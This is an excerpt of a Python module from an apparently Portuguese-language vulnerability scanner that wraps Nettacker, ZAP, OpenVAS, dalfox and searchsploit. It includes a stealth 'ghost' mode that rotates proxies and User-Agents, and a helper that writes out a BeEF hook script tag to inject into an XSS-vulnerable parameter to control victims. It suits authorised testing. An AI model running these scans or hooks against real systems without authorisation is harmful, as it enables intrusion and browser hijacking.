#!/usr/bin/env python3
"""
SENTINELA - Vulnerability Detection Module v2
...
class VulnDetectionModule:
    def __init__(self, config: dict, prior_web: dict = None, prior_recon: dict = None):
        ...
        from modules.ghost import GhostRotator
        self.ghost = GhostRotator(config)
        if self.session and self.ghost.enabled:
            self.ghost.patch_session(self.session)
    ...
    def run(self) -> dict:
        ...
        if self.intensity != "passive" and shutil.which("nettacker"):
            log("  → OWASP Nettacker (scan complementar)...", Colors.CYAN)
            results["nettacker_findings"] = self._rodar_nettacker(base_url)
            log(f"    {len(results['nettacker_findings'])} finding(s) do Nettacker (após dedup por CVE)", Colors.GREEN)

        zap_bin = shutil.which("zap.sh") or shutil.which("owasp-zap") or shutil.which("zaproxy")
        if self.intensity != "passive" and self.config.get("mode") != "stealth" and zap_bin:
            log("  → OWASP ZAP (DAST, --full opcional no install.sh)...", Colors.CYAN)
            results["zap_findings"] = self._rodar_zap(base_url, zap_bin)
            log(f"    {len(results['zap_findings'])} finding(s) do ZAP", Colors.GREEN)

        if self.config.get("openvas"):
            log("  → OpenVAS/GVM (opt-in, requer GVM já rodando)...", Colors.CYAN)
            results["openvas_findings"] = self._consultar_openvas(base_url)
            log(f"    {len(results['openvas_findings'])} finding(s) do OpenVAS", Colors.GREEN)

        results["findings"] = self.findings
        return results

    # ── Scanners CVE/DAST extras ─────────────────────────────────────────────

    def _rodar_nettacker(self, base_url: str) -> list:
        """OWASP Nettacker como scan complementar ao Nuclei — mescla sem
        duplicar achado que já saiu por CVE ID."""
        achados = []
        cves_ja_conhecidos = {c["cve"] for c in self.findings if isinstance(c, dict) and c.get("cve")}
        try:
            outfile = tempfile.mktemp(suffix=".json")
            proc = subprocess.run(
                ["nettacker", "-i", base_url, "-o", outfile, "--json"],
                capture_output=True, text=True, timeout=self.config.get("tool_timeout", 300),
            )
            if os.path.exists(outfile):
                with open(outfile) as fh:
                    dados = json.load(fh)
                for item in dados if isinstance(dados, list) else dados.get("results", []):
                    cve = item.get("cve", "")
                    if cve and cve in cves_ja_conhecidos:
                        continue
                    achados.append(item)
                    self.findings.append(make_finding(
                        (item.get("severity") or "MEDIUM").upper(), "Nettacker",
                        item.get("description", item.get("title", "Achado do Nettacker")),
                        url=base_url))
                os.unlink(outfile)
        except Exception:
            pass
    ...
    def _rodar_zap(self, base_url: str, zap_bin: str) -> list:
        """ZAP em modo CLI headless — timeout curto, só standard+."""
        achados = []
        try:
            outfile = tempfile.mktemp(suffix=".json")
            proc = subprocess.run(
                [zap_bin, "-cmd", "-quickurl", base_url, "-quickout", outfile,
                 "-quickprogress"],
                capture_output=True, text=True,
                timeout=min(self.config.get("tool_timeout", 300), 300),
            )
            if os.path.exists(outfile):
                with open(outfile) as fh:
                    dados = json.load(fh)
                for site in dados.get("site", []) or []:
                    for alerta in site.get("alerts", []) or []:
                        ...
                        self.findings.append(make_finding(
                            self._mapear_severidade_zap(alerta.get("riskcode", "1")),
                            "ZAP", alerta.get("name", "Achado do ZAP"),
                            detail=alerta.get("desc", ""), url=base_url,
                            remediation=alerta.get("solution", "")))
                os.unlink(outfile)
        except Exception:
            pass
        return achados

    def _mapear_severidade_zap(self, riskcode) -> str:
        return {"3": "CRITICAL", "2": "HIGH", "1": "MEDIUM", "0": "LOW"}.get(str(riskcode), "MEDIUM")

    def _consultar_openvas(self, base_url: str) -> list:
        """Conecta a uma instância GVM/OpenVAS JÁ RODANDO via gvm-cli. A
        SENTINELA NUNCA instala/configura o GVM — só importa resultado se
        --openvas foi pedido explicitamente E o GVM já estiver acessível."""
        if not shutil.which("gvm-cli"):
            log("    gvm-cli não encontrado — OpenVAS precisa estar configurado separadamente. "
                "Ver: https://greenbone.github.io/docs/", Colors.YELLOW)
            return []
        achados = []
        host = urlparse(base_url).netloc.split(":")[0]
        try:
            proc = subprocess.run(
                ["gvm-cli", "--gmp-username", "admin", "socket",
                 "--xml", f"<get_results filter=\"host={host}\"/>"],
                capture_output=True, text=True, timeout=60,
            )
            if proc.returncode == 0 and proc.stdout:
                achados.append({"raw_xml": proc.stdout[:2000]})
                self.findings.append(make_finding(
                    "INFO", "OpenVAS", f"Resultados do GVM consultados pra {host}",
                    detail="Resultado bruto salvo — revisar manualmente no GSA (interface web do GVM) "
                           "pra análise completa.", url=base_url))
        except Exception as e:
            log(f"    Erro ao consultar GVM: {e}", Colors.YELLOW)
        return achados

    # ── HEADER AUDIT ──────────────────────────────────────────────────────────

    def _pace(self, fator: float = 1.0):
        """Pausa entre requisições: jitter aleatório no modo ghost, senão rate_limit fixo.
        Também rotaciona User-Agent/proxy da sessão a cada chamada quando o modo ghost está ativo."""
        if self.ghost.enabled:
            self.ghost.patch_session(self.session)
            self.ghost.jitter_sleep(fator)
        else:
            time.sleep(self.rate_limit * fator)
    ...
    def _audit_headers(self, url: str) -> dict:
        ...
        try:
            ...
            log(f"    [!] Não foi possível conectar em {url} — auditoria de headers NÃO "
                f"executada (não é o mesmo que \"0 headers ausentes\"): {e}", Colors.YELLOW)
        return result
    ...
    def _probe_xss_all(self, base_url: str) -> list:
            ...
            for payload in payloads:
                ...
                if result:
                    ...
                    self.findings.append(make_finding("HIGH", "XSS",
                        ...
                        url=url,
                        detail=self._nota_prova_impacto_beef(url, list(params.keys())[0] if params else "param"),
        ...
        if shutil.which("dalfox"):
            urls_ja_achadas = {f.get("url") for f in all_findings}
            for finding in self._rodar_dalfox(base_url):
                if finding["url"] not in urls_ja_achadas:
                    all_findings.append(finding)
                    self.findings.append(make_finding("HIGH", "XSS",
                        f"Reflected/DOM XSS at {finding['url']} (dalfox)",
                        evidence=f"Payload: {finding.get('payload','')[:60]}",
                        url=finding["url"],
                        remediation="Encode output. Implement strict CSP."))
                    log_finding("HIGH", f"XSS (dalfox) at {finding['url']}", finding.get("payload", "")[:50])

        return all_findings

    def _rodar_dalfox(self, base_url: str) -> list:
        """Roda dalfox como scanner de XSS complementar (mais moderno, detecta
        DOM XSS e bypasses de filtro que o probing customizado não cobre).
        Resultados são mesclados sem duplicar URL já encontrada."""
        achados = []
        try:
            proc = subprocess.run(
                ["dalfox", "url", base_url, "--silence", "--format", "json",
                 "--timeout", str(min(self.timeout, 15))],
                capture_output=True, text=True, timeout=self.config.get("tool_timeout", 300),
            )
            ...
            for linha in proc.stdout.splitlines():
                ...
                if url:
                    achados.append({"url": url, "payload": item.get("payload", ""), "method": "dalfox"})
        except Exception:
            pass
        return achados

    def _nota_prova_impacto_beef(self, url: str, param: str) -> str:
        """Se --beef-hook-url foi informado, anexa instruções MANUAIS de
        prova de impacto via BeEF. A SENTINELA nunca injeta o hook nem
        controla o BeEF sozinha — só orienta o operador. Requer autorização
        própria pra essa ação adicional contra uma vítima real."""
        hook_url = self.config.get("beef_hook_url")
        if not hook_url:
            return ""
        return (
            f" | Prova de impacto disponível (AÇÃO MANUAL, requer autorização própria): "
            f"payload de hook do BeEF pra injetar manualmente no parâmetro `{param}` de {url}: "
            f"<script src=\"{hook_url}\"></script> — depois de injetado, controle a vítima "
            f"pelo painel do BeEF. A SENTINELA NÃO injeta isso automaticamente nem controla "
            f"o BeEF — essa é uma ação adicional fora do escopo do scan automatizado."
        )
        ...
        for fp in fingerprints:
            for cve_id, info in CVE_DB.items():
                ...
                if any(kw.lower() in fp.lower() for kw in info["keywords"]):
                    seen.add(cve_id)
                    exploits = self._buscar_exploits_offline(fp)
                    detalhe = info["description"]
                    if exploits:
                        detalhe += f" | Exploits públicos conhecidos (searchsploit, apenas informativo — " \
                                    f"NÃO executado): {'; '.join(exploits[:5])}"
                    findings.append({
                        "cve": cve_id,
                        "title": info["title"],
    ...
    def _buscar_exploits_offline(self, fingerprint: str) -> list:
        """Consulta searchsploit (Exploit-DB offline) pelo fingerprint de
        software/versão — só INFORMA que existe exploit público, nunca
        baixa/executa nada."""
        if not shutil.which("searchsploit"):
            return []
        try:
            proc = subprocess.run(
                ["searchsploit", "--json", fingerprint],
                capture_output=True, text=True, timeout=15,
            )
            if not proc.stdout.strip():
                return []
            dados = json.loads(proc.stdout)
            resultados = dados.get("RESULTS_EXPLOIT", [])
            return [r.get("Title", "") for r in resultados[:5] if r.get("Title")]
        except Exception:
            return []
    ...
    def _get_base_url(self) -> str:
        candidatos = list(self.prior_web.get("base_urls", []))
        if not candidatos:
            t = self.target
            for prefix in ("https://", "http://"):
                if t.lower().startswith(prefix):
                    ...
                    break
            t = t.rstrip("/")
            candidatos = [f"https://{t}", f"http://{t}"]

        # Confirma qual esquema realmente responde antes de fixar a base —
        # sem isso, alvos só-HTTP (rodando --vuln sem --web antes) tinham
        # TODA a auditoria falhando em silêncio contra https:// inexistente
        # e reportando "0 findings" como se estivesse tudo seguro.
        if self.session:
            for url in candidatos:
                try:
                    self.session.get(url, timeout=min(self.timeout, 8), verify=False,
